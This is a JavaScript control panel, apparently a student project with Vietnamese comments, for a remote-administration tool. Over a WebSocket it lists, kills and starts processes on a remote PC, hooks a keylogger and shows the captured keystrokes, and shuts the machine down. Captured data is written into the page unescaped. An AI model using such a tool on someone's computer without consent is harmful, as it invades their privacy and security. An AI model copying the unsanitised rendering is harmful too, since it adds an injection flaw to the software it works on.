// --- BIẾN TOÀN CỤC ---
let currentWindow = 0;
let ws = null;
let currentAction = ''; 
let isInSubMenu = false; // Biến này dùng để check xem ta đang ở Main hay Sub

// Biến Parse Dữ liệu
let parsingMode = null; 
let expectedItems = 0;
let currentItemsReceived = 0;
let tempRowData = []; 

// --- WEBSOCKET ---
function initWebSocket() {
    ws = new WebSocket("ws://localhost:8080");

    ws.onopen = () => {
        console.log("Connected to Proxy");
        ws.send("GET_SERVERS|"); 
        showToast("Backend Ready", "success");
    };

    ws.onmessage = (event) => {
        try {
            const msg = JSON.parse(event.data);
            handleServerMessage(msg);
        } catch (e) {
            console.log("Raw Data:", event.data);
        }
    };

    ws.onclose = () => {
        showToast("Connection Lost", "error");
        disconnectUI();
    };
}

function handleServerMessage(msg) {
    if (msg.type === "DISCOVERY") {
        const select = document.getElementById('serverSelect');
        let exists = false;
        for (let i = 0; i < select.options.length; i++) {
            if (select.options[i].value === msg.ip) exists = true;
        }
        if (!exists) {
            const option = document.createElement("option");
            option.text = msg.ip;
            option.value = msg.ip;
            select.add(option);
            if (select.options.length === 1 || select.options[0].disabled) {
                if(select.options[0].disabled) select.remove(0);
                select.value = msg.ip;
            }
        }
    } 
    else if (msg.type === "STATUS") {
        if (msg.connected) {
            document.getElementById('homePage').classList.add('hidden');
            setTimeout(() => {
                document.getElementById('mainContainer').classList.add('active');
                updateStatus(true);
                showToast("Connected to Server", "success");
                isInSubMenu = false; // Mới vào thì chắc chắn ở Main Menu
            }, 500);
        } else {
            disconnectUI();
        }
    } 
    else if (msg.type === "ERROR") {
        showToast(msg.msg, "error");
    }
    else if (msg.type === "LOG") {
        const data = msg.data; 
        
        // 1. XỬ LÝ PHẢN HỒI LỆNH (KILL/START SUCCESS)
        if (data.includes("successfully") || data.includes("Error:") || data.includes("Unable to")) {
            const isError = data.toLowerCase().includes("error") || data.includes("Unable");
            showToast(data.trim(), isError ? "error" : "success");
            
            // Gọi hàm refresh (đã được tối ưu bên dưới)
            setTimeout(() => refreshListAfterAction(), 300);
            return;
        }

        // 2. XỬ LÝ KEYLOG
        if (parsingMode === 'KEYLOG') {
            const keylogOut = document.getElementById('keylogOutput');
            let formatted = data.replace(/\n/g, "<br>");
            keylogOut.innerHTML += formatted + "<br>"; 
            keylogOut.scrollTop = keylogOut.scrollHeight;
            return;
        }

        // 3. XỬ LÝ DANH SÁCH (PROCESS / APP)
        if (parsingMode === 'PROCESS' || parsingMode === 'APP') {
            if (expectedItems === 0) {
                if (!isNaN(data.trim()) && parseInt(data.trim()) > 0) {
                    expectedItems = parseInt(data.trim());
                    currentItemsReceived = 0;
                    tempRowData = [];
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = ''; 
                    console.log(`Receiving ${expectedItems} items...`);
                } else if (data.trim() === "0") {
                    const listId = parsingMode === 'PROCESS' ? 'processList' : 'appList';
                    document.getElementById(listId).innerHTML = '<div class="loading-text">No items found.</div>';
                }
            } else {
                tempRowData.push(data.trim());
                const linesPerItem = parsingMode === 'PROCESS' ? 3 : 4;
                
                if (tempRowData.length === linesPerItem) {
                    renderListItem(tempRowData); 
                    tempRowData = []; 
                    currentItemsReceived++;
                    
                    if (currentItemsReceived >= expectedItems) {
                        expectedItems = 0;
                        showToast("List updated", "success");
                    }
                }
            }
        }
    }
}

function renderListItem(data) {
    if (parsingMode === 'PROCESS') {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">⚙️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">PID: ${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">${data[2]} Threads</span></div>
            </div>`;
        document.getElementById('processList').insertAdjacentHTML('beforeend', html);
    } else {
        const html = `
            <div class="data-row">
                <div class="col-main">
                    <div class="row-icon">🖥️</div>
                    <div class="row-info">
                        <span class="row-name" title="${data[0]}">${data[0]}</span>
                        <span class="row-sub">${data[1]}</span>
                    </div>
                </div>
                <div class="col-detail"><span class="badge">PID: ${data[2]}</span></div>
            </div>`;
        document.getElementById('appList').insertAdjacentHTML('beforeend', html);
    }
}

// --- HÀM REFRESH ĐƠN GIẢN ---
function refreshListAfterAction() {
    // Chỉ cần gọi lại Show. Logic thông minh nằm trong hàm Show.
    if (parsingMode === 'APP') showAppList(); 
    else showProcessList();
}

// --- LOGIC HIỂN THỊ LIST (ĐÃ SỬA LỖI 2 QUIT) ---
function showProcessList() {
    // 1. Reset UI
    document.getElementById('processList').style.display = 'block';
    document.getElementById('processList').innerHTML = '<div class="loading-text">⟳ Fetching processes...</div>';
    parsingMode = 'PROCESS';
    expectedItems = 0;
    currentItemsReceived = 0;

    // 2. Logic xử lý Server State
    if (!isInSubMenu) {
        // TRƯỜNG HỢP A: Đang ở Main Menu -> Vào thẳng
        ws.send("CMD|PROCESS");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        // TRƯỜNG HỢP B: Đang ở Sub Menu (hoặc kẹt ở Kill)
        // Gửi ĐÚNG 1 lệnh QUIT.
        // - Nếu đang ở Process -> Ra Main.
        // - Nếu đang ở Kill -> Ra Process.
        ws.send("CMD|QUIT");
        
        setTimeout(() => {
            // Sau khi QUIT, ta gửi lệnh PROCESS.
            // - Nếu nãy ra Main -> Giờ vào Process (Đúng ý).
            // - Nếu nãy ra Process -> Giờ gửi "PROCESS" (Server Process loop ko hiểu lệnh này -> Bỏ qua -> Vẫn ở Process) (Không sao cả).
            ws.send("CMD|PROCESS");
            isInSubMenu = true;

            setTimeout(() => {
                ws.send("CMD|XEM");
            }, 300);
        }, 300);
    }
}

function showAppList() {
    document.getElementById('appList').style.display = 'block';
    document.getElementById('appList').innerHTML = '<div class="loading-text">⟳ Fetching applications...</div>';
    parsingMode = 'APP';
    expectedItems = 0;
    currentItemsReceived = 0;

    if (!isInSubMenu) {
        ws.send("CMD|APPLICATION");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|XEM"), 300);
    } else {
        ws.send("CMD|QUIT");
        setTimeout(() => {
            ws.send("CMD|APPLICATION");
            isInSubMenu = true;
            setTimeout(() => ws.send("CMD|XEM"), 300);
        }, 300);
    }
}

function showInput(action) {
    if (action.includes('App')) parsingMode = 'APP';
    else parsingMode = 'PROCESS';

    // Đảm bảo đã vào menu con.
    // Nếu chưa vào (ví dụ người dùng bấm Kill ngay khi vừa kết nối)
    if (!isInSubMenu) {
        if (parsingMode === 'APP') ws.send("CMD|APPLICATION");
        else ws.send("CMD|PROCESS");
        isInSubMenu = true;
    }
    
    currentAction = action;
    const modal = document.getElementById('inputModal');
    const input = document.getElementById('modalInput');
    
    input.value = '';
    modal.classList.add('active');
    
    if (action.includes('kill')) {
        document.getElementById('modalTitle').textContent = 'Terminate';
        input.placeholder = 'Enter PID (e.g. 1234)';
    } else {
        document.getElementById('modalTitle').textContent = 'Start';
        input.placeholder = 'Enter Name (e.g. notepad)';
    }
    input.focus();
}

function closeModal() { document.getElementById('inputModal').classList.remove('active'); }

function submitInput() {
    closeModal();
    const value = document.getElementById('modalInput').value.trim();
    if (!value) return;

    // Gửi lệnh + ID. Không gửi QUIT.
    if (currentAction.includes('kill')) {
        ws.send("CMD|KILL");
        setTimeout(() => ws.send("CMD|KILLID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    } 
    else if (currentAction.includes('start')) {
        ws.send("CMD|START");
        setTimeout(() => ws.send("CMD|STARTID"), 50);
        setTimeout(() => ws.send(`CMD|${value}`), 100);
    }

    showToast('Processing...', 'info');
}

// --- CORE FUNCTIONS ---
function connect() {
    const ip = document.getElementById('serverSelect').value;
    if (!ip) return showToast('Select a server first', 'warning');
    ws.send(`CONNECT|${ip}`);
}

function disconnect() {
    // Reset an toàn khi disconnect
    if(isInSubMenu) ws.send("CMD|QUIT"); 
    isInSubMenu = false;
    setTimeout(() => ws.send("DISCONNECT|"), 200);
}

function disconnectUI() {
    updateStatus(false);
    document.getElementById('mainContainer').classList.remove('active');
    document.getElementById('homePage').classList.remove('hidden');
    currentWindow = 0;
    isInSubMenu = false;
    parsingMode = null;
    document.getElementById('windowsWrapper').style.transform = `translateX(0)`;
}

function updateStatus(connected) {
    const box = document.getElementById('statusBox');
    const text = document.getElementById('statusText');
    box.className = connected ? 'status-box connected' : 'status-box disconnected';
    text.textContent = connected ? 'Connected' : 'Disconnected';
    if(connected) text.classList.add('success'); else text.classList.remove('success');
}

function navigateTo(index) {
    // Khi chuyển tab, ta dùng logic 1 QUIT an toàn
    // Nếu đang ở Sub, QUIT 1 cái ra Main.
    if (currentWindow === 2 && index !== 2) {
        ws.send("CMD|QUIT"); 
        setTimeout(() => {
            ws.send("CMD|KEYLOG");
            setTimeout(() => ws.send("CMD|UNHOOK"), 50);
            setTimeout(() => ws.send("CMD|DELETE"), 100);
            setTimeout(() => {
                ws.send("CMD|QUIT");
                isInSubMenu = false;
            }, 150);
        }, 100);

        showToast('Keylogger stopped & cleaned', 'info');
    }
    else if (isInSubMenu) {
        ws.send("CMD|QUIT");
        isInSubMenu = false;
        parsingMode = null; 
        expectedItems = 0;
    }

    currentWindow = index;
    const wrapper = document.getElementById('windowsWrapper');
    wrapper.style.transform = `translateX(-${index * 100}vw)`;
    
    const buttons = document.querySelectorAll('.nav-btn');
    const btn = buttons[index];
    const indicator = document.getElementById('navIndicator');
    if(btn) {
        indicator.style.width = btn.offsetWidth + 'px';
        indicator.style.left = btn.offsetLeft + 'px';
    }
}

// --- ACTIONS KEYLOG ---
function hookKeylog() {
    // Logic an toàn cho Keylog
    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
    
    setTimeout(() => {
        ws.send("CMD|KEYLOG");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|HOOK"), 100);
    }, 200);
    showToast('Keylog Hooked', 'success');
}

function unhookKeylog() {
    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
    
    setTimeout(() => {
        ws.send("CMD|KEYLOG");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|UNHOOK"), 100);
    }, 200);
    showToast('Keylog Unhooked', 'warning');
}

function printKeylog() {
    if(isInSubMenu) { ws.send("CMD|QUIT"); isInSubMenu=false; }
    
    parsingMode = 'KEYLOG'; 
    const output = document.getElementById('keylogOutput');
    output.style.display = 'block';
    if (output.innerHTML.trim() !== "") {
        output.innerHTML += '<div class="log-separator">---------------- NEW SESSION ----------------</div>';
    }
    output.scrollTop = output.scrollHeight;

    setTimeout(() => {
        ws.send("CMD|KEYLOG");
        isInSubMenu = true;
        setTimeout(() => ws.send("CMD|PRINT"), 100);
    }, 200);
}

function deleteLogs() {
    if(!confirm("Clear Keylog history on screen?")) return;
    document.getElementById('keylogOutput').innerHTML = '';
    showToast('Screen history cleared', 'success');
}

function shutdownServer() {
    if(confirm("Shutdown remote PC?")) {
        if (isInSubMenu) ws.send("CMD|QUIT");
        setTimeout(() => ws.send("CMD|SHUTDOWN"), 300);
    }
}
function restartServer() { showToast("Restart not implemented", "warning"); }

// --- INIT ---
window.onload = () => {
    initWebSocket();
    document.getElementById('modalInput').value = '';
    const btn = document.querySelector('.nav-btn');
    if(btn) document.getElementById('navIndicator').style.width = btn.offsetWidth + 'px';
};
function handleModalEnterKey(e) { if(e.key==='Enter') submitInput(); }